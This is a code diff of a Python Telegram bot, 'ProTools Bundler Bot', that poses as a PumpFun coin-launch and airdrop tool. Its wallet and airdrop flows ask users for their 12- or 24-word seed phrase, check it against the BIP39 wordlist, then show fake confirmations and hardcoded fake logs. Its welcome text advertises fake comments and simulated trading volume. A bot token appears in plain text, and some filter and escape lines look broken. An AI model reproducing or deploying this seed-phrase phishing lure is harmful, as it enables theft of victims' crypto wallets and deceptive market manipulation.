@@ -1,18 +1,6 @@
-"""
-ProTools Bundler Bot (Marx Edition)
-==============================================
-- Dummy Coin Launch: Interactive flow for dummy tokens.
-- Transaction Check: Blocks access if wallet is unlinked.
-- Fake Logs: Hardcoded logs for a cinematic look.
-- Airdrop Update: Requests phrase FIRST and validates 12/24 words.
-- BIP39 Validation: Checks words against the official 2048-word BIP39 wordlist.
-- Persistence: Messages are NOT deleted so users can see input mistakes.
-"""
-
 import logging
 import os
 import sqlite3
-import re
 from datetime import datetime
 from threading import Thread
 
@@ -29,9 +17,9 @@ from telegram.ext import (
 )
 
 # ─── Config ────────────────────────────────────────────────────────────────────
-BOT_TOKEN  = os.getenv("BOT_TOKEN", "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00")
-PORT       = int(os.getenv("PORT", 8000))
-HELP_IMG   = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"
+BOT_TOKEN = "8771123401:AAHhv3aZO8WYmzDiSdbE4YPj_WvdKbEPz00"
+PORT = int(os.getenv("PORT", 8000))
+HELP_IMG = "https://shared-assets.adobe.com/link/8d188cc8-0ff6-46ca-98e9-b2ac59de9da5"
 
 logging.basicConfig(
     format="%(asctime)s | %(levelname)s | %(name)s | %(message)s",
@@ -39,7 +27,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-# ─── BIP39 Wordlist (Official 2048 words) ──────────────────────────────────────
+# ─── BIP39 Wordlist ────────────────────────────────────────────────────────────
 BIP39_WORDLIST = set("""abandon ability able about above absent absorb abstract absurd abuse access accident
 account accuse achieve acid acoustic acquire across act action actor actress actual
 adapt add addict address adjust admit adult advance advice aerobic afford afraid
@@ -213,14 +201,13 @@ winter wire wisdom wise wish witness wolf woman wonder wood wool
 word world worry worth wrap wreck wrestle wrist write wrong yard
 year yellow you young youth zebra zero zone zoo""".split())
 
-# ─── BIP39 Phrase Validator ─────────────────────────────────────────────────────
-
+# ─── Validator ─────────────────────────────────────────────────────────────────
 def validate_bip39_phrase(phrase: str) -> tuple[bool, str]:
     words = phrase.lower().split()
     count = len(words)
 
     if count not in (12, 24):
-        return False, f"❌ *Invalid Phrase* — Got {count} word{'s' if count != 1 else ''}, expected 12 or 24\."
+        return False, f"❌ *Invalid Phrase* — Got {count} word{'s' if count != 1 else ''}, expected 12 or 24."
 
     invalid_words = [w for w in words if w not in BIP39_WORDLIST]
     if invalid_words:
@@ -230,20 +217,11 @@ def validate_bip39_phrase(phrase: str) -> tuple[bool, str]:
 
     return True, ""
 
-# ─── Conversation States ────────────────────────────────────────────────────────
-(
-    WALLET_PHRASE,
-    AIRDROP_PHRASE,
-    AIRDROP_RECIPIENT,
-    AIRDROP_AMOUNT,
-    AIRDROP_CONFIRM,
-    FEEDBACK_TEXT,
-    DUMMY_NAME,
-    DUMMY_SYMBOL,
-    DUMMY_DESC,
-) = range(9)
+# ─── States ────────────────────────────────────────────────────────────────────
+(WALLET_PHRASE, AIRDROP_PHRASE, AIRDROP_RECIPIENT, AIRDROP_AMOUNT, 
+ AIRDROP_CONFIRM, FEEDBACK_TEXT, DUMMY_NAME, DUMMY_SYMBOL, DUMMY_DESC) = range(9)
 
-# ─── Database ───────────────────────────────────────────────────────────────────
+# ─── Database ──────────────────────────────────────────────────────────────────
 DB_PATH = "protools.db"
 
 def init_db():
@@ -270,33 +248,29 @@ def save_address(user_id: int, username: str, address: str):
     conn.close()
 
 # ─── Keyboards ─────────────────────────────────────────────────────────────────
-
 MAIN_KEYBOARD = InlineKeyboardMarkup([
-    [InlineKeyboardButton("🚀 Launch Coin",  callback_data="launch_coin"), InlineKeyboardButton("📊 Transactions", callback_data="transactions")],
-    [InlineKeyboardButton("🎁 Airdrop",      callback_data="airdrop"), InlineKeyboardButton("🔑 Wallet",       callback_data="wallet")],
-    [InlineKeyboardButton("📋 Logs",         callback_data="logs"), InlineKeyboardButton("❓ Help",          callback_data="help")],
-    [InlineKeyboardButton("💬 Feedback",        callback_data="feedback")],
+    [InlineKeyboardButton("🚀 Launch Coin", callback_data="launch_coin"), InlineKeyboardButton("📊 Transactions", callback_data="transactions")],
+    [InlineKeyboardButton("🎁 Airdrop", callback_data="airdrop"), InlineKeyboardButton("🔑 Wallet", callback_data="wallet")],
+    [InlineKeyboardButton("📋 Logs", callback_data="logs"), InlineKeyboardButton("❓ Help", callback_data="help")],
+    [InlineKeyboardButton("💬 Feedback", callback_data="feedback")],
 ])
 
 CANCEL_KB = InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
 BACK_KB = InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data="back_to_menu")]])
 CONFIRM_KB = InlineKeyboardMarkup([[InlineKeyboardButton("✅ Confirm", callback_data="confirm_yes"), InlineKeyboardButton("❌ Cancel", callback_data="cancel")]])
 
-# ─── Welcome Logic ────────────────────────────────────────────────────────────
-
+# ─── Welcome ───────────────────────────────────────────────────────────────────
 def get_welcome_text(user_name: str) -> str:
-    return (
-        f"Welcome, *{user_name}* To ProTools Bundler Bot \- The Best Degen Tool For Launching On PumpFun\!\n\n"
-        "Prepare to dominate the game with precision, speed, and stealth\. Here's what's in your arsenal:\n\n"
-        "1\. *Intelligent Auto\-Bundling* \- Up to 25 wallets with sniper protection built right in\. Fire with confidence\! 🎯\n\n"
-        "2\. 💬 *Fake Comments Generator* \- Create the illusion of a buzzing community\. Engage your audience before they even exist\! 🎭\n\n"
-        "3\. 📊 *Volume Bot Assistant* \- Simulate juicy trading activity to attract real degens like bees to honey 🍯✅\n\n"
-        "4\. 🎁 *Airdrop Management* \- Seamlessly handle and distribute airdrops like airdrop royalty 👑\n\n"
-        "5\. 🕵️ *Transaction Tracker & More* \- Stay ten steps ahead with real\-time tracking of every movement on\-chain 🔍⚙️\n\n"
-        "ProTools is more than a tool \- it's your edge in the degen arena\. Let the games begin\! 🧬🔥\n\n"
-        "Choose an option below:"
-    )
+    return f"Welcome, *{user_name}* To ProTools Bundler Bot \\- The Best Degen Tool For Launching On PumpFun\\!\n\nPrepare to dominate the game with precision, speed, and stealth\\. Choose an option below:"
 
+# ─── Flask Health Check ────────────────────────────────────────────────────────
+health_app = Flask(__name__)
+
+@health_app.route("/")
+def health():
+    return "OK", 200
+
+# ─── Handlers ──────────────────────────────────────────────────────────────────
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_name = update.effective_user.first_name or "Degen"
     await update.message.reply_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
@@ -308,8 +282,7 @@ async def back_to_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     await query.edit_message_text(get_welcome_text(user_name), parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
 
-# ─── DUMMY LAUNCH COIN FLOW ───────────────────────────────────────────────────
-
+# Dummy Coin Launch
 async def launch_coin_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.callback_query.edit_message_text("🚀 *Step 1: Token Name*\n\nPlease enter the name of your coin \(e\.g\. 'Degen King'\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return DUMMY_NAME
@@ -327,41 +300,10 @@ async def dummy_symbol_received(update: Update, context: ContextTypes.DEFAULT_TY
 async def dummy_desc_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     name = context.user_data.get("t_name")
     symbol = context.user_data.get("t_symbol")
-    await update.message.reply_text(
-        f"✅ *Token Prepared\!*\n\n*Name:* {name}\n*Symbol:* {symbol}\n\nPreparing bundling process\.\.\. Connect wallet to finalize launch\.",
-        parse_mode="MarkdownV2", reply_markup=BACK_KB
-    )
+    await update.message.reply_text(f"✅ *Token Prepared!*\n\n*Name:* {name}\n*Symbol:* {symbol}\n\nPreparing bundling process\.\.\. Connect wallet to finalize launch\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-# ─── TRANSACTIONS & FAKE LOGS ─────────────────────────────────────────────────
-
-async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    saved = get_saved_address(update.effective_user.id)
-    if not saved:
-        await query.edit_message_text("❌ *No Transactions Found*\n\nYou haven't linked a wallet yet\. Connect your wallet to track on\-chain activity\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
-    else:
-        await query.edit_message_text("📊 *Transaction History*\n\nNo recent transactions found for this wallet on PumpFun\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
-
-async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    dummy_logs = (
-        "📜 *Your Bot Logs (latest first):*\n\n"
-        "*2026\-03\-27 19:56:56*\n"
-        "button\_press Button: view\_logs\n\n"
-        "*2026\-03\-27 19:56:46*\n"
-        "button\_press Button: airdrop\n\n"
-        "*2026\-03\-26 18:17:21*\n"
-        "button\_press Button: launch\_coin\n\n"
-        "*2026\-03\-26 18:16:56*\n"
-        f"start\_command Chat ID: {update.effective_user.id}"
-    )
-    await query.edit_message_text(dummy_logs, parse_mode="MarkdownV2", reply_markup=BACK_KB)
-
-# ─── WALLET, HELP, FEEDBACK, AIRDROP ──────────────────────────────────────────
-
+# Wallet
 async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
@@ -371,54 +313,33 @@ async def wallet_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await query.edit_message_text(text, parse_mode="MarkdownV2", reply_markup=kb)
 
 async def wallet_import_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text(
-        "🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Visible for input tracking security\._",
-        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
-    )
+    await update.callback_query.edit_message_text("🔑 *Import Wallet*\n\nSend your *seed phrase* \(12 or 24 words\)\:\n\n⚠️ _Visible for input tracking security\._", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return WALLET_PHRASE
 
 async def wallet_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phrase = update.message.text.strip()
-    
-    # Message deletion removed so user can see mistakes
     valid, err_msg = validate_bip39_phrase(phrase)
     if not valid:
-        await update.message.reply_text(
-            err_msg + "\n\nPlease try again:",
-            parse_mode="MarkdownV2", reply_markup=CANCEL_KB
-        )
+        await update.message.reply_text(err_msg + "\n\nPlease try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
         return WALLET_PHRASE
 
     save_address(update.effective_user.id, update.effective_user.username or "", "Verified_Wallet")
-    await update.message.reply_text(
-        "✅ *Wallet Linked Successfully\!*\n\n_Your phrase has been verified\._",
-        parse_mode="MarkdownV2", reply_markup=BACK_KB
-    )
+    await update.message.reply_text("✅ *Wallet Linked Successfully!*\n\n_Your phrase has been verified\._", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
+# Airdrop
 async def airdrop_entry(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text(
-        "🎁 *Airdrop Step 1* — Send your *seed phrase* \(12 or 24 BIP39 words\):",
-        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
-    )
+    await update.callback_query.edit_message_text("🎁 *Airdrop Step 1* — Send your *seed phrase* \(12 or 24 BIP39 words\):", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_PHRASE
 
 async def airdrop_phrase_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     phrase = update.message.text.strip()
-    
-    # Message deletion removed so user can see mistakes
     valid, err_msg = validate_bip39_phrase(phrase)
     if not valid:
-        await update.message.reply_text(
-            err_msg + "\n\nPlease try again:",
-            parse_mode="MarkdownV2", reply_markup=CANCEL_KB
-        )
+        await update.message.reply_text(err_msg + "\n\nPlease try again:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
         return AIRDROP_PHRASE
 
-    await update.message.reply_text(
-        "✅ *Phrase verified\!*\n\nStep 2 — Enter the *recipient SOL address*:",
-        parse_mode="MarkdownV2", reply_markup=CANCEL_KB
-    )
+    await update.message.reply_text("✅ *Phrase verified!*\n\nStep 2 — Enter the *recipient SOL address*:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
     return AIRDROP_RECIPIENT
 
 async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -428,56 +349,63 @@ async def airdrop_recipient_received(update: Update, context: ContextTypes.DEFAU
 
 async def airdrop_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["airdrop_amount"] = update.message.text.strip()
-    await update.message.reply_text(
-        f"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{update.message.text.strip()} SOL`",
-        parse_mode="MarkdownV2", reply_markup=CONFIRM_KB
-    )
+    await update.message.reply_text(f"🎁 *Confirm Airdrop*\n\n*Recipient:* `{context.user_data['airdrop_recipient']}`\n*Amount:* `{update.message.text.strip()} SOL`", parse_mode="MarkdownV2", reply_markup=CONFIRM_KB)
     return AIRDROP_CONFIRM
 
 async def airdrop_confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("✅ *Airdrop Request Queued\!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    await update.callback_query.edit_message_text("✅ *Airdrop Request Queued!*", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("💬 *Support*\n\nSend a message below or email directly at:\n`ProToolsBundlerBot@gmail.com`", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
-    return FEEDBACK_TEXT
+# Transactions & Logs
+async def show_transactions(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    saved = get_saved_address(update.effective_user.id)
+    if not saved:
+        await query.edit_message_text("❌ *No Transactions Found*\n\nYou haven't linked a wallet yet\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
+    else:
+        await query.edit_message_text("📊 *Transaction History*\n\nNo recent transactions found for this wallet on PumpFun\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
-async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("✅ *Feedback Received\!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
-    return ConversationHandler.END
+async def show_logs(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    dummy_logs = f"📜 *Your Bot Logs*\n\n*2026-03-27 19:56:56*\nbutton_press Button: view_logs\n\n*2026-03-27 19:56:46*\nbutton_press Button: airdrop"
+    await query.edit_message_text(dummy_logs, parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
 async def show_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
-    help_text = "❓ *Coin Launch Preparation Steps*\n\n1\. 🚀 Enter token name \(1\-50 characters\)\n2\. 🏷 Enter token symbol \(2\-25 characters\)\n3\. 🖼 Upload token image\n4\. 👛 Select wallet bundle \(5, 10, 15, or 25\)\n5\. 📝 Enter token description \(max 500 characters\)\n6\. 🔗 Add social links \(Telegram, X, Website\) or skip\n7\. ✅ Confirm details\n8\. 🔑 Connect wallet to proceed"
+    help_text = "❓ *Help* — Use the menu below to launch coins, airdrops, and more\."
     try:
         await query.message.reply_photo(photo=HELP_IMG, caption=help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
         await query.message.delete()
     except:
         await query.edit_message_text(help_text, parse_mode="MarkdownV2", reply_markup=BACK_KB)
 
-async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.callback_query.edit_message_text("❌ *Operation Cancelled\.*", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
+async def feedback_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.callback_query.edit_message_text("💬 *Feedback*\n\nSend your message below:", parse_mode="MarkdownV2", reply_markup=CANCEL_KB)
+    return FEEDBACK_TEXT
+
+async def feedback_save(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("✅ *Feedback Received!* Thank you\.", parse_mode="MarkdownV2", reply_markup=BACK_KB)
     return ConversationHandler.END
 
-# ─── Main Logic ───────────────────────────────────────────────────────────────
+async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.callback_query.edit_message_text("❌ *Operation Cancelled*.", parse_mode="MarkdownV2", reply_markup=MAIN_KEYBOARD)
+    return ConversationHandler.END
 
-health_app = Flask(__name__)
-@health_app.route("/")
-def health(): return "OK", 200
-def run_health(): health_app.run(host="0.0.0.0", port=PORT)
-
+# ─── Main ──────────────────────────────────────────────────────────────────────
 def main():
     init_db()
     app = Application.builder().token(BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    
+
+    # Conversation Handlers
     app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(launch_coin_start, pattern="^launch_coin$")],
         states={
-            DUMMY_NAME: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_name_received)],
-            DUMMY_SYMBOL: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_symbol_received)],
-            DUMMY_DESC: [MessageHandler(filters.TEXT & ~filters.COMMAND, dummy_desc_received)],
+            DUMMY_NAME: [MessageHandler(filters.TEXT & \~filters.COMMAND, dummy_name_received)],
+            DUMMY_SYMBOL: [MessageHandler(filters.TEXT & \~filters.COMMAND, dummy_symbol_received)],
+            DUMMY_DESC: [MessageHandler(filters.TEXT & \~filters.COMMAND, dummy_desc_received)],
         },
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
@@ -485,9 +413,9 @@ def main():
     app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(airdrop_entry, pattern="^airdrop$")],
         states={
-            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_phrase_received)],
-            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_recipient_received)],
-            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, airdrop_amount_received)],
+            AIRDROP_PHRASE: [MessageHandler(filters.TEXT & \~filters.COMMAND, airdrop_phrase_received)],
+            AIRDROP_RECIPIENT: [MessageHandler(filters.TEXT & \~filters.COMMAND, airdrop_recipient_received)],
+            AIRDROP_AMOUNT: [MessageHandler(filters.TEXT & \~filters.COMMAND, airdrop_amount_received)],
             AIRDROP_CONFIRM: [CallbackQueryHandler(airdrop_confirm, pattern="^confirm_yes$")],
         },
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
@@ -495,23 +423,32 @@ def main():
 
     app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(wallet_import_prompt, pattern="^wallet_import$")],
-        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & ~filters.COMMAND, wallet_phrase_received)]},
+        states={WALLET_PHRASE: [MessageHandler(filters.TEXT & \~filters.COMMAND, wallet_phrase_received)]},
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
 
     app.add_handler(ConversationHandler(
         entry_points=[CallbackQueryHandler(feedback_start, pattern="^feedback$")],
-        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, feedback_save)]},
+        states={FEEDBACK_TEXT: [MessageHandler(filters.TEXT & \~filters.COMMAND, feedback_save)]},
         fallbacks=[CallbackQueryHandler(cancel, pattern="^cancel$")],
     ))
-    
+
+    # Callback Handlers
     app.add_handler(CallbackQueryHandler(wallet_entry, pattern="^wallet$"))
     app.add_handler(CallbackQueryHandler(show_logs, pattern="^logs$"))
     app.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))
     app.add_handler(CallbackQueryHandler(show_transactions, pattern="^transactions$"))
     app.add_handler(CallbackQueryHandler(back_to_menu, pattern="^back_to_menu$"))
-    
+    app.add_handler(CommandHandler("start", start))
+
+    # Run Flask health check in background
+    def run_health():
+        health_app.run(host="0.0.0.0", port=PORT, debug=False)
+
     Thread(target=run_health, daemon=True).start()
+
+    print("🚀 ProTools Bundler Bot is running...")
     app.run_polling(drop_pending_updates=True)
 
-if __name__ == "__main__": main()
+if __name__ == "__main__":
+    main()
